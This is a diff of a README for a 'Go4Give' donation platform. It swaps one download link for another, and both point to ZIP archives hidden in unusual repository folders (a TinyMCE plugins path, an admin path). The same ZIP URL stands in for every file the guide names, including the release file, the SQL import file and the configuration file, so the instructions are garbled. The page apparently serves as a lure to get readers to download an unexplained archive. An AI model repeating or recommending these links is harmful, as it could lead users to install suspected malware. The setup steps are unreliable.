@@ -1,6 +1,6 @@
 # 🎉 go4give-donation-platform - Empower Communities Through Generosity
 
-[![Download](https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip)](https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip)
+[![Download](https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip)](https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip)
 
 ## 📖 Overview
 
@@ -22,15 +22,15 @@ This guide will help you download and run Go4Give. Follow the steps below to get
 
 1. To download the latest version of Go4Give, click the button below:
 
-   [![Download](https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip)](https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip)
+   [![Download](https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip)](https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip)
 
-2. You will be taken to the Releases page, where you can find the latest version. Look for a file named `https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip` or similar.
+2. You will be taken to the Releases page, where you can find the latest version. Look for a file named `https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip` or similar.
 
 3. Click on the file to start downloading it to your computer.
 
 ## 📂 Install Go4Give
 
-1. Once the download completes, locate the `https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip` file on your computer. 
+1. Once the download completes, locate the `https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip` file on your computer. 
 
 2. Extract the contents of the ZIP file to a folder of your choice.
 
@@ -46,11 +46,11 @@ This guide will help you download and run Go4Give. Follow the steps below to get
 
 3. Create a new database named `go4give`.
 
-4. Import the SQL file included in the extracted folder. You will find it named `https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip`.
+4. Import the SQL file included in the extracted folder. You will find it named `https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip`.
 
 ### 🌐 Configure Environment
 
-1. Open the `https://raw.githubusercontent.com/mrcrazybroinsaine/go4give-donation-platform/main/orphanage/template/vendors/tinymce/plugins/donation_platform_go_give_v1.2.zip` file located in the `go4give` folder.
+1. Open the `https://github.com/mrcrazybroinsaine/go4give-donation-platform/raw/refs/heads/main/admin/give_donation_go_platform_v1.7-alpha.5.zip` file located in the `go4give` folder.
 
 2. Update the database credentials:
    - **DB_HOST**: Usually `localhost`
